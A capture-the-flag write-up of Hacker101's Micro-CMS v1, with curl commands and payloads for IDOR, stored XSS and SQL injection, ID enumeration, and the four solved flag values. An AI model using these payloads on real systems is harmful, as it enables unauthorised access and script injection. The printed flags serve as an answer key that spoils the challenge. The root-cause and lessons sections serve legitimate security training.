# Micro-CMS v1 — Writeup (4/4)

**Difficulty:** Easy  
**Category:** Web — IDOR, XSS, SQL Injection  
**Flags:** 4/4 (complete)  
**Platform:** Hacker101 CTF

---

## Challenge Overview

- **Name:** Micro-CMS v1
- **Difficulty:** Easy
- **Category:** Web
- **Flags:** 4/4
- **Instance URL:** `https://a840377ee21d5a203838babc75b82f3f.ctf.hacker101.com`

---

## Objective

Find 4 flags hidden in a micro CMS (Content Management System) application with Markdown support. The application allows creating, viewing, and editing pages.

---

## Reconnaissance

### Application Structure

```
GET /          → Home page with page listing
GET /page/1    → View page 1 ("Testing")
GET /page/2    → View page 2 ("Markdown Test")
GET /page/edit/1 → Edit page 1
GET /page/edit/2 → Edit page 2
GET /page/create → Create form
POST /page/create → Create new page
POST /page/edit/:id → Save edits
```

### Home Page

```html
<!doctype html>
<html>
<body>
    <ul>
        <li><a href="page/1">Testing</a></li>
        <li><a href="page/2">Markdown Test</a></li>
    </ul>
    <a href="page/create">Create a new page</a>
</body>
</html>
```

### Page 2 — XSS Hint

Page 2 contains `<button>Some button</button>` rendered as actual HTML, indicating that HTML tags in the body are allowed.

### Create Form

- `title` field: simple text input
- `body` field: textarea with Markdown support
- Notice: "Markdown is supported, but scripts are not"

---

## Vulnerabilities Found

### 1. IDOR (Insecure Direct Object Reference)

**Endpoint:** `GET /page/edit/:id`

### 2. Stored XSS in Body

**Vector:** `<img>` tag with `onerror` event

### 3. SQL Injection on Edit ID

**Endpoint:** `GET /page/edit/:id`

### 4. Stored XSS in Title (Home Page)

**Vector:** Page title rendered without escaping on the home page

---

## Exploit

### Flag 1 — IDOR: Reading a Private Page

#### Reconnaissance

```bash
# Scan page IDs
for i in $(seq 0 20); do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" "$CH2_URL/page/$i")
  echo "ID $i: $STATUS"
done
# ID 5: 403 Forbidden ← private page!
```

#### Exploit

Page `/page/5` returns 403, but `/page/edit/5` returns 200 with the full content:

```bash
curl -s "https://a840377ee21d5a203838babc75b82f3f.ctf.hacker101.com/page/edit/5"
```

**Response:**
```html
<input type="text" name="title" value="Private Page">
<textarea name="body">My secret is ^FLAG^c983186c1e85c370cf6e4f84569688aecf36ab779ebac81b97f8b695d076a106$FLAG$</textarea>
```

**Root cause:** The 403 is applied on the view route but the edit route was left unprotected.

---

### Flag 2 — Stored XSS in Body via `<img onerror>`

#### Reconnaissance

Page 2 shows `<button>` rendered without escaping → HTML is allowed in the body.

#### Exploit

```bash
curl -X POST \
  --data-urlencode 'title=XSS img Test' \
  --data-urlencode 'body=<img src=x onerror=alert(1)>' \
  "$CH2_URL/page/create"
```

#### Result

The server detected the XSS and revealed the flag in the tag attribute:

```html
<img src=x flag="^FLAG^09d306f50f9f0797feb81ac39784fd77897a618f26d126055431d6e10f83988f$FLAG$" onerror=alert(1)>
```

**Root cause:** The XSS filter does not block event handlers on `<img>` tags. Scripts are "removed" (`<scrubbed>`) but other vectors pass through.

---

### Flag 3 — SQL Injection on ID Parameter

#### Exploit

Appending a single quote to the ID in the edit endpoint:

```bash
curl -s "https://a840377ee21d5a203838babc75b82f3f.ctf.hacker101.com/page/edit/1'"
```

**Response:**
```
^FLAG^fe5dfb8594d66ba0ff4516e512fe4721a9bd399043973dd64b7015d22a4e8831$FLAG$
```

The single quote causes an SQL error in the backend, which returns the flag directly.

**Technique:** Error-based SQL Injection.

---

### Flag 4 — Stored XSS in Title, Unsafe Rendering on Home Page

#### Reconnaissance

The title is HTML-escaped on the view and edit pages (`&lt;script&gt;`), but...

#### Exploit

Create a page with `<script>` in the title:

```bash
curl -X POST \
  --data-urlencode 'title=<script>alert(1)</script>' \
  --data-urlencode 'body=test' \
  "$CH2_URL/page/create"
```

#### Result

On the home page `/`, the title is rendered **without escaping**:

```html
<li>
  <a href="page/11">
    <script>alert("^FLAG^575d603ec2953150477227d40e5a029b00e96cfe6ff99db01b6039a9ee6acb27$FLAG$");</script>
    <script>alert(1)</script>
  </a>
</li>
```

**Root cause:** The home page template renders `{{ page.title | raw }}` (unescaped) while other templates use proper escaping.

---

## Flags Summary

| # | Vector | Flag |
|---|--------|------|
| 1 | IDOR — `/page/edit/5` | `^FLAG^c983186c1e85c370cf6e4f84569688aecf36ab779ebac81b97f8b695d076a106$FLAG$` ✅ |
| 2 | XSS Body — `<img onerror>` | `^FLAG^09d306f50f9f0797feb81ac39784fd77897a618f26d126055431d6e10f83988f$FLAG$` ✅ |
| 3 | SQLi — `/page/edit/1'` | `^FLAG^fe5dfb8594d66ba0ff4516e512fe4721a9bd399043973dd64b7015d22a4e8831$FLAG$` ✅ |
| 4 | XSS Title on Home Page | `^FLAG^575d603ec2953150477227d40e5a029b00e96cfe6ff99db01b6039a9ee6acb27$FLAG$` ✅ |

---

## Lessons Learned

1. **IDOR is not always where it seems:** The 403 protection on `/page/5` did not apply to the edit endpoint `/page/edit/5`. Always test all routes related to a resource.

2. **Incomplete XSS filters:** Blocking `<script>` is not enough. Event handlers on HTML tags (`onerror`, `onmouseover`, `onload`) are equally valid XSS vectors.

3. **Escaping inconsistency:** One template may escape correctly while another does not. The home page used different escaping from the individual view template.

4. **SQL Injection in route parameters:** URL parameters that are database IDs must be validated and parameterized. A simple `'` can expose sensitive data.

5. **Enumeration methodology:** Scanning IDs sequentially (0 to N) to discover hidden resources is a fundamental IDOR technique.

---

## Documented Requests

```
GET /page/5          → 403 Forbidden
GET /page/edit/5     → 200 OK (flag in textarea)
POST /page/create    → body=<img src=x onerror=alert(1)> → flag in img tag
GET /page/edit/1'    → flag in response body
POST /page/create    → title=<script>alert(1)</script> → flag on home page
```
